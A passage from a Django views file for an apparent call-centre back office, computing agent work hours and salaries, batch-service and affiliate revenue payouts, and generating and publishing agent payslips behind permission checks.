            #meeting =  datetime.strptime(str(work_hours['meeting']), time_format) - datetime.strptime('00:00:00', time_format)
            #afk = datetime.strptime(str(work_hours['afk']), time_format) - datetime.strptime('00:00:00', time_format)
            #technical_issue = datetime.strptime(str(work_hours['technical_issue']), time_format) - datetime.strptime('00:00:00', time_format)
            #paid_leaves =  datetime.strptime(str(work_hours['paid_leaves']), time_format) - datetime.strptime('00:00:00', time_format)
            #deductions =  datetime.strptime(str(work_hours['deductions']), time_format) - datetime.strptime('00:00:00', time_format)

            hours_str, minutes_str, seconds_str = str(ready).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            ready = timedelta(hours=hours, minutes=minutes, seconds=seconds)

            # Add timedelta objects together
            hours_str, minutes_str, seconds_str = str(break_).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            break_ = timedelta(hours=hours, minutes=minutes, seconds=seconds)


            # Add timedelta objects together
            hours_str, minutes_str, seconds_str = str(meeting).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            meeting = timedelta(hours=hours, minutes=minutes, seconds=seconds)


            # Add timedelta objects together
            hours_str, minutes_str, seconds_str = str(afk).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            afk = timedelta(hours=hours, minutes=minutes, seconds=seconds)


                            # Add timedelta objects together
            hours_str, minutes_str, seconds_str = str(technical_issue).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            technical_issue = timedelta(hours=hours, minutes=minutes, seconds=seconds)

            # Create a timedelta object


                            # Add timedelta objects together
            hours_str, minutes_str, seconds_str = str(technical_issue).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            technical_issue = timedelta(hours=hours, minutes=minutes, seconds=seconds)


            hours_str, minutes_str, seconds_str = str(paid_leaves).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            paid_leaves = timedelta(hours=hours, minutes=minutes, seconds=seconds)

            hours_str, minutes_str, seconds_str = str(deductions).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            deductions = timedelta(hours=hours, minutes=minutes, seconds=seconds)


            hours_str, minutes_str, seconds_str = str(deducted_hours).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            deducted_hours = timedelta(hours=hours, minutes=minutes, seconds=seconds)


            hours_str, minutes_str, seconds_str = str(added_hours).split(':')

            # Convert hours, minutes, and seconds to integers
            hours = int(hours_str)
            minutes = int(minutes_str)
            seconds = int(seconds_str)

            # Create a timedelta object
            added_hours = timedelta(hours=hours, minutes=minutes, seconds=seconds)




            work_hours['total_hours'] = ready + break_ + meeting + afk + technical_issue
            work_hours['total_paid_hours'] = ready + meeting + paid_leaves + added_hours - deductions - deducted_hours
            
            work_hours['total_hours'] = formating_hours(work_hours['total_hours'])
            work_hours['total_paid_hours'] = formating_hours(work_hours['total_paid_hours'])

            # Add timedelta objects together
            hours, minutes, seconds = map(int, str(work_hours["total_paid_hours"]).split(':'))
        
            # Calculate total hours worked (including fractional hours for minutes and seconds)
            total_hours_worked = hours + (minutes / 60) + (seconds / 3600)
            
            # Define the hourly rate (e.g., $2 per hour)
            hourly_rate = agent.hourly_rate
            
            payment = total_hours_worked * hourly_rate
                
            work_hours['salary'] = payment






        affiliates = AffiliateUser.objects.filter(active=True)
        context = { 
                    'affiliates':affiliates,
                    'teams': teams,
                    'requestprofile':requestprofile,
                    'notifications':notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'agents_hours':agents_hours,
                    'work_status':work_status,
                    }
        return render(request, "agents/agents_salaries_searched.html",context)
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
        'affiliates':affiliates,
        'teams':teams,
        'requestprofile':requestprofile,
        'notifications':notifications,
        'messages':messages,
        'permissions' :permissions,
        
    }

        
    return render(request, "agents/agents_salaries_search.html", context)    



@login_required(login_url="/login")
def batchservice(request):
    
    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
 
    if not permissions.batchservice_view:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    


    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()
    datem = int(date.strftime("%m"))
    month_name = calendar.month_name[datem]
    batch_clients = Client.objects.filter(batchservice=True,active=True)
    for client in batch_clients:
        try:            
            batchclient = BatchClient.objects.get(client=client,date__month=datem)
        except:    
            BatchClient.objects.create(date=date,client=client,client_profile=client.client_profile)

    batch_clients = BatchClient.objects.filter(date__month=datem,active=True)

    total_week1, total_week2, total_week3, total_week4, =  0,0,0,0
    total_pay1, total_pay2, total_pay3, total_pay4 = 0,0,0,0
    for batchclient in batch_clients:
        total_week1 += batchclient.week1_revenue
        total_week2 += batchclient.week2_revenue
        total_week3 += batchclient.week3_revenue
        total_week4 += batchclient.week4_revenue 
        total_pay1 += batchclient.week1_revenue * 0.3
        total_pay2 += batchclient.week2_revenue * 0.3
        total_pay3 += batchclient.week3_revenue * 0.3
        total_pay4 += batchclient.week4_revenue * 0.3

    total_revenue = total_week1+total_week2+total_week3+total_week4
    total_payouts = total_pay1+total_pay2+total_pay3+total_pay4
    total_bank = total_revenue * 0.03
    total_tax = total_revenue * 0.02
    total_net = total_revenue - (total_payouts+total_bank+total_tax)
    total = {'tot_week1':total_week1,
            'tot_week2':total_week2,
            'tot_week3':total_week3,
            'tot_week4':total_week4,
            'tot_pay1':total_pay1,
            'tot_pay2':total_pay2,
            'tot_pay3':total_pay3,
            'tot_pay4':total_pay4,
            'total_revenue': total_revenue,
            'total_payouts': total_payouts,
            'total_bank': total_bank,
            'total_tax': total_tax,
            'total_net':total_net,
            }
    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'notifications':notifications,
               'messages':messages,
               'month_name':month_name,
               'batch_clients':batch_clients,
               'permissions':permissions,
               'work_status':work_status,
               'total':total,

               }
    
    return render(request, 'batchservice/dashboard.html', context)



@login_required(login_url="/login")
def batchservice_client(request,client_id):
    
    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
 
    if not permissions.batchservice_edit:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    


    date = datetime.now(timezone('US/Eastern')).date()
    datem = int(date.strftime("%m"))
    client = BatchClient.objects.get(id=client_id)
    month_name = calendar.month_name[client.date.month]



    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'notifications':notifications,
               'messages':messages,
               'month_name':month_name,
               'permissions':permissions,
               'work_status':work_status,
               'client':client,
               }

    if request.method == "POST":
        data = request.POST
        client = BatchClient.objects.get(id=client_id)
        week1_rev = data.get('week1_rev')            
        week2_rev = data.get('week2_rev')
        week3_rev = data.get('week3_rev')
        week4_rev = data.get('week4_rev')
        week1_rev_r = data.get('week1_rev_r')
        week2_rev_r = data.get('week2_rev_r')
        week3_rev_r = data.get('week3_rev_r')
        week4_rev_r = data.get('week4_rev_r')
        week1_rev_b = data.get('week1_rev_b')
        week2_rev_b = data.get('week2_rev_b')
        week3_rev_b = data.get('week3_rev_b')
        week4_rev_b = data.get('week4_rev_b')
        notes = data.get('notes')

        if week1_rev_r == "True":
            week1_rev_r = True
        elif week1_rev_r == "False":
            week1_rev_r = False

        if week2_rev_r == "True":
            week2_rev_r = True
        else:
            week2_rev_r = False

        if week3_rev_r == "True":
            week3_rev_r = True
        else:
            week3_rev_r = False
      
        if week4_rev_r == "True":
            week4_rev_r = True
        else:
            week4_rev_r = False

        if week1_rev_b == "True":
            week1_rev_b = True
        else:
            week1_rev_b = False



        if week2_rev_b == "True":
            week2_rev_b = True
        else:
            week2_rev_b = False

        if week3_rev_b == "True":
            week3_rev_b = True
        else:
            week3_rev_b = False

        if week4_rev_b == "True":
            week4_rev_b = True
        else:
            week4_rev_b = False


        """        week1_batch = float(week1_rev) * 0.3
        week2_batch = float(week2_rev) * 0.3
        week3_batch = float(week3_rev) * 0.3
        week4_batch = float(week4_rev) * 0.3"""

        client.week1_revenue=float(week1_rev)
        client.week2_revenue=float(week2_rev)
        client.week3_revenue=float(week3_rev)
        client.week4_revenue=float(week4_rev)
        client.week1_paid_client = week1_rev_r
        client.week2_paid_client = week2_rev_r
        client.week3_paid_client = week3_rev_r
        client.week4_paid_client = week4_rev_r
        client.week1_paid_batch = week1_rev_b
        client.week2_paid_batch = week2_rev_b
        client.week3_paid_batch = week3_rev_b
        client.week4_paid_batch = week4_rev_b
        client.notes = notes
        client.save()
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,batchservice=client,log_info="Modified BatchService Payments, Client ID: "+str(client.id))



        




    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'notifications':notifications,
               'messages':messages,
               'month_name':month_name,
               'permissions':permissions,
               'work_status':work_status,
               'client':client,
               }

    
    return render(request, 'batchservice/client_profile.html', context)



@login_required(login_url="/login")
def batchservice_search(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.batchservice_view:
        return redirect("/access-denied")



    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    agents = Profile.objects.filter(active=True, role="coldcaller")
    agents_hours = {}

    #print(agents_hours)
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()

    datem = int(date.strftime("%m"))
    month_name = calendar.month_name[datem]
    if request.method == "POST":
        data = request.POST
        date=data.get('month') 
        year,month = date.split('-')
        clients = BatchClient.objects.filter(active=True,date__month=month,date__year=year)
        month_name = calendar.month_name[int(month)]
        affiliates = AffiliateUser.objects.filter(active=True)
        context = {
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'batch_clients':clients,
                'work_status':work_status,
                'month_name':month_name,
                }
        return render(request, 'batchservice/dashboard.html', context)

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    return render(request, 'batchservice/search.html', context)




@login_required(login_url="/login")
def affiliate(request,affiliate):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.nedialo_affiliate_view_all:
        return redirect("/access-denied")
    if not permissions.nedialo_affiliate:
        try:
            affiliate = AffiliateUser.objects.get(slug=affiliate)
        except:
            pass
        if not request.user == affiliate.affiliate_user:
            return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    

    try:
        affiliate = AffiliateUser.objects.get(slug=affiliate)
        affiliate_clients = AffiliateClient.objects.filter(affiliate_user=affiliate)
    except:
        pass 
    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    affiliates = AffiliateUser.objects.filter(active=True)
    affiliate = AffiliateUser.objects.get(affiliate_user=User.objects.get(username=affiliate))
    
    date = datetime.now(timezone('US/Eastern')).date()
    datem = int(date.strftime("%m"))
    month_name = calendar.month_name[datem]


    affiliate_clients = AffiliateClient.objects.filter(affiliate_user=affiliate,active=True)
    for client in affiliate_clients:
        try:            
            affiliate_client = AffiliateClient.objects.get(client=client.client,date__month=datem)
        except:    
            AffiliateClient.objects.create(date=date,affiliate_user=affiliate,client=client.client,client_profile=client.client_profile)

    affiliate_clients = AffiliateClient.objects.filter(affiliate_user=affiliate, date__month=datem,active=True)


    affiliate_clients = AffiliateClient.objects.filter(affiliate_user=affiliate , date__month=datem,active=True)

    total_week1, total_week2, total_week3, total_week4, =  0,0,0,0
    total_pay1, total_pay2, total_pay3, total_pay4 = 0,0,0,0
    for client in affiliate_clients:
        total_week1 += client.week1_revenue
        total_week2 += client.week2_revenue
        total_week3 += client.week3_revenue
        total_week4 += client.week4_revenue 
        total_pay1 += client.week1_revenue * 0.2
        total_pay2 += client.week2_revenue * 0.2
        total_pay3 += client.week3_revenue * 0.2
        total_pay4 += client.week4_revenue * 0.2

    total_revenue = total_week1+total_week2+total_week3+total_week4
    total_payouts = total_pay1+total_pay2+total_pay3+total_pay4
    total_bank = total_revenue * 0.03
    total_tax = total_revenue * 0.02
    total_net = total_revenue - (total_payouts+total_bank+total_tax)
    total = {'tot_week1':total_week1,
            'tot_week2':total_week2,
            'tot_week3':total_week3,
            'tot_week4':total_week4,
            'tot_pay1':total_pay1,
            'tot_pay2':total_pay2,
            'tot_pay3':total_pay3,
            'tot_pay4':total_pay4,
            'total_revenue': total_revenue,
            'total_payouts': total_payouts,
            'total_bank': total_bank,
            'total_tax': total_tax,
            'total_net':total_net,
            }

    context = {
                'month_name':month_name,
               'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'affiliate':affiliate, 
               'affiliate_clients':affiliate_clients,
               'notifications':notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               'total':total,
    }
    return render(request, 'affiliate/dashboard.html', context)








@login_required(login_url="/login")
def affiliate_report(request,affiliate_id):
    
    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
 
    if not permissions.nedialo_affiliate_edit:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    


    date = datetime.now(timezone('US/Eastern')).date()
    datem = int(date.strftime("%m"))
    client = AffiliateClient.objects.get(id=affiliate_id)
    month_name = calendar.month_name[client.date.month]



    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'notifications':notifications,
               'messages':messages,
               'month_name':month_name,
               'permissions':permissions,
               'work_status':work_status,
               'client':client,
               }
    

    if request.method == "POST":
        data = request.POST
        client = AffiliateClient.objects.get(id=affiliate_id)
        week1_rev = data.get('week1_rev')            
        week2_rev = data.get('week2_rev')
        week3_rev = data.get('week3_rev')
        week4_rev = data.get('week4_rev')
        week1_rev_r = data.get('week1_rev_r')
        week2_rev_r = data.get('week2_rev_r')
        week3_rev_r = data.get('week3_rev_r')
        week4_rev_r = data.get('week4_rev_r')
        week1_rev_b = data.get('week1_rev_b')
        week2_rev_b = data.get('week2_rev_b')
        week3_rev_b = data.get('week3_rev_b')
        week4_rev_b = data.get('week4_rev_b')
        notes = data.get('notes')

        if week1_rev_r == "True":
            week1_rev_r = True
        elif week1_rev_r == "False":
            week1_rev_r = False

        if week2_rev_r == "True":
            week2_rev_r = True
        else:
            week2_rev_r = False

        if week3_rev_r == "True":
            week3_rev_r = True
        else:
            week3_rev_r = False
      
        if week4_rev_r == "True":
            week4_rev_r = True
        else:
            week4_rev_r = False

        if week1_rev_b == "True":
            week1_rev_b = True
        else:
            week1_rev_b = False



        if week2_rev_b == "True":
            week2_rev_b = True
        else:
            week2_rev_b = False

        if week3_rev_b == "True":
            week3_rev_b = True
        else:
            week3_rev_b = False

        if week4_rev_b == "True":
            week4_rev_b = True
        else:
            week4_rev_b = False


        """        week1_batch = float(week1_rev) * 0.3
        week2_batch = float(week2_rev) * 0.3
        week3_batch = float(week3_rev) * 0.3
        week4_batch = float(week4_rev) * 0.3"""

        client.week1_revenue=float(week1_rev)
        client.week2_revenue=float(week2_rev)
        client.week3_revenue=float(week3_rev)
        client.week4_revenue=float(week4_rev)
        client.week1_paid_client = week1_rev_r
        client.week2_paid_client = week2_rev_r
        client.week3_paid_client = week3_rev_r
        client.week4_paid_client = week4_rev_r
        client.week1_paid_affiliate = week1_rev_b
        client.week2_paid_affiliate = week2_rev_b
        client.week3_paid_affiliate = week3_rev_b
        client.week4_paid_affiliate = week4_rev_b
        client.notes = notes
        client.save()
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,affiliate=client,log_info="Modified Affiliates Payments, Client ID: "+str(client.id))



        




    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'notifications':notifications,
               'messages':messages,
               'month_name':month_name,
               'permissions':permissions,
               'work_status':work_status,
               'client':client,
               }

    
    return render(request, 'affiliate/client_profile.html', context)





@login_required(login_url="/login")
def affiliate_search(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.nedialo_affiliate_view_all:
        return redirect("/access-denied")



    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    


    date = datetime.now(timezone('US/Eastern')).date()

    datem = int(date.strftime("%m"))
    month_name = calendar.month_name[datem]
    if request.method == "POST":
        data = request.POST
        date=data.get('month') 
        year,month = date.split('-')
        try:
            affiliate = data.get('affiliate')
        except:
            pass
        if permissions.nedialo_affiliate_client_view:
            affiliate_user = request.user
        else:
            affiliate_user =  User.objects.get(username=affiliate)

        month_name = calendar.month_name[int(month)]
        affiliates = AffiliateUser.objects.filter(active=True)
        affiliate = AffiliateUser.objects.get(active=True, affiliate_user=affiliate_user)
        
        date = datetime.now(timezone('US/Eastern')).date()
        datem = int(date.strftime("%m"))
        month_name = calendar.month_name[datem]



        affiliate_clients = AffiliateClient.objects.filter(affiliate_user=affiliate ,date__month=month,date__year=year, active=True)

        total_week1, total_week2, total_week3, total_week4, =  0,0,0,0
        total_pay1, total_pay2, total_pay3, total_pay4 = 0,0,0,0
        for client in affiliate_clients:
            total_week1 += client.week1_revenue
            total_week2 += client.week2_revenue
            total_week3 += client.week3_revenue
            total_week4 += client.week4_revenue 
            total_pay1 += client.week1_revenue * 0.2
            total_pay2 += client.week2_revenue * 0.2
            total_pay3 += client.week3_revenue * 0.2
            total_pay4 += client.week4_revenue * 0.2

        total_revenue = total_week1+total_week2+total_week3+total_week4
        total_payouts = total_pay1+total_pay2+total_pay3+total_pay4
        total_bank = total_revenue * 0.03
        total_tax = total_revenue * 0.02
        total_net = total_revenue - (total_payouts+total_bank+total_tax)
        total = {'tot_week1':total_week1,
                'tot_week2':total_week2,
                'tot_week3':total_week3,
                'tot_week4':total_week4,
                'tot_pay1':total_pay1,
                'tot_pay2':total_pay2,
                'tot_pay3':total_pay3,
                'tot_pay4':total_pay4,
                'total_revenue': total_revenue,
                'total_payouts': total_payouts,
                'total_bank': total_bank,
                'total_tax': total_tax,
                'total_net':total_net,
                }

        context = {
                'month_name':month_name,
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'affiliate':affiliate, 
                'affiliate_clients':affiliate_clients,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                'total':total,
        }
        return render(request, 'affiliate/dashboard.html', context)

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    return render(request, 'affiliate/search.html', context)







@login_required(login_url="/login")
def agents_payslips_admin(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_payslips:
        return redirect("/access-denied")

    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    requestprofile = Profile.objects.get(user=request.user)

    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]

    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    affiliates = AffiliateUser.objects.filter(active=True)

    # Initialize default month and date
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()
    month_num = int(date.strftime("%m"))
    month = calendar.month_name[month_num]
    date_month = date.month  # Month as a number (1-12)
    date_year = date.year 
    date_month_num = int(date.strftime("%m"))
    date_year_num = int(date.strftime("%Y"))



    # Handling AJAX request for date filtering
    if request.method == 'GET' and request.is_ajax():
        selected_date = request.GET.get('date')

        print(selected_date)
        date_obj = datetime.strptime(selected_date, '%Y-%m')
        date_month = date_obj.month
        date_year = date_obj.year


        if selected_date:
            payslips_list = AgentsPayslip.objects.filter(date__month=date_month,date__year=date_year, active=True)
            payslips_data = [{'month': slip.month,'month_num':slip.date.month,'year_num':slip.date.year, 'agent_user': slip.agent_profile.userid, 'agent_name': slip.agent_profile.full_name, 'published': slip.published} for slip in payslips_list]
            return JsonResponse({'data': payslips_data})

    # Initialize payslips for current month if not already created
    agents = Profile.objects.filter(active=True, role="coldcaller")
    for agent in agents:
        try:
            agent_payslip = AgentsPayslip.objects.get(agent_profile=agent, date__month=date_month, date__year=date_year)
        except AgentsPayslip.DoesNotExist:
            agent_payslip = AgentsPayslip.objects.create(month=month ,date=date, time=time, agent_profile=agent, agent_user=agent.user)

    payslips_list = AgentsPayslip.objects.filter(date__month=date_month,date__year=date_year, active=True)

    # Convert payslips_list to a JSON serializable format

    payslips_data = [{'month': slip.month,'month_num':date_month_num, 'year_num':date_year_num,'agent_user': slip.agent_profile.userid, 'agent_name': slip.agent_profile.full_name, 'published': slip.published} for slip in payslips_list]

    context = {
        'messages': messages,
        'notifications': notifications,
        'affiliates': affiliates,
        'teams': teams,
        'requestprofile': requestprofile,
        'permissions': permissions,
        'work_status': work_status,
        'payslips': payslips_data,
        'date': date.strftime('%Y-%m'),  # Include the date in the context
    }

    return render(request, "agents/agents_payslips_admin.html", context)







@login_required(login_url="/login")
def payslip_publish(request,agentid,month,year):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_payslips:
        return redirect("/access-denied")



    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    


    
    

    date = datetime.now(timezone('US/Eastern')).date()
    date_month = date.month  # Month as a number (1-12)
    date_year = date.year 

    agent = Profile.objects.get(active=True,userid=agentid,role="coldcaller")
    agent_payslip = AgentsPayslip.objects.get(agent_profile=agent,date__month=month,date__year=year,active=True)
    if agent_payslip.published:
        agent_payslip.published = False
    else:
        agent_payslip.published = True

    agent_payslip.save()

    
    
    return redirect("/agents-payslips")



@login_required(login_url="/login")
def payslip_view(request,agentid, month, year):
    context = {}



    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    affiliates = AffiliateUser.objects.filter(active=True)


    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    agentprofile = Profile.objects.get(userid=agentid)


    date = datetime.now(timezone('US/Eastern')).date()
    

    try: 
        payslip = AgentsPayslip.objects.get(agent_profile=agentprofile,date__month=month,date__year=year,active=True)
    except:
        redirect('')
    if agentprofile.user == request.user:
        if not payslip.published:
            return redirect("/access-denied")
    else:
        if not permissions.agents_payslips:
            return redirect("/access-denied")
        
    

    agent = agentprofile
    agent_hours = {}

    datem =  payslip.date.month
    datey =  payslip.date.year

 

    
    hours = WorkStatus.objects.filter(active=True,date__month=datem,date__year=datey,profile=agent)
    
    #work_statuses = [Ready, Break , Meeting , AFK , Technical Issue , End Shift ]
    work_hours = {
            'logged_in':"00:00:00",
            'ready':"00:00:00",
            'break':"00:00:00",
            'meeting':"00:00:00",
            'afk':"00:00:00",
            'technical_issue':"00:00:00",
            'end_shift':"00:00:00",
            'logged_out':"00:00:00",
            'total_hours':"00:00:00",
            'total_paid_hours':"00:00:00",
            'paid_leaves':"00:00:00",
            'deductions':"00:00:00",
            'salary':0,
            }
    deductions = Action.objects.filter(agent=agent.user,action_type="deduction",status="approved",active=True, submission_date__month=datem, submission_date__year=datey)
    ded_total = 0
    for ded in deductions:
        if type(ded.deduction_amount) == int:
            ded_total +=ded.deduction_amount

        # Replace this with your actual total deduction time in hours

    # Parse the initial time string
    total_seconds = ded_total * 3600
    minutes, seconds = divmod(total_seconds, 60)
    hours_, minutes = divmod(minutes, 60)
    
    # Format the time as HH:MM:SS
    formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

    # Update the deductions in work_hours dictionary
    work_hours['deductions'] = formatted_time
    
    deducted_hours = ManualHours.objects.filter(agent_user=agent.user,positive=False,active=True, date__month=datem,date__year=datey)
    deducted_hours_list = deducted_hours

    ded_hours_total = 0
    for ded in deducted_hours:
        if type(ded.hours) == int:
            ded_hours_total +=ded.hours

        # Replace this with your actual total deduction time in hours

    # Parse the initial time string
    total_seconds = ded_hours_total * 3600
    minutes, seconds = divmod(total_seconds, 60)
    hours_, minutes = divmod(minutes, 60)
    
    # Format the time as HH:MM:SS
    formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

    # Update the deductions in work_hours dictionary
    work_hours['deducted_hours'] = formatted_time
    
    added_hours = ManualHours.objects.filter(agent_user=agent.user,positive=True,active=True, date__month=datem,date__year=datey)
    added_hours_list = added_hours
    added_hours_total = 0
    for hr in added_hours:
        if type(hr.hours) == int:
            added_hours_total +=hr.hours

        # Replace this with your actual total deduction time in hours

    # Parse the initial time string
    total_seconds = added_hours_total * 3600
    minutes, seconds = divmod(total_seconds, 60)
    hours_, minutes = divmod(minutes, 60)
    
    # Format the time as HH:MM:SS
    formatted_time = f"{hours_:02}:{minutes:02}:{seconds:02}"

    # Update the deductions in work_hours dictionary
    work_hours['added_hours'] = formatted_time
    

    leavesupl = len(Leave.objects.filter(agent=agent.user,leave_type="upl",status="approved",active=True, requested_date__month=datem, requested_date__year=datey))
    leavesall = len(Leave.objects.filter(agent=agent.user,status="approved",active=True, requested_date__month=datem, requested_date__year=datey))
    
    leaves = leavesall-leavesupl

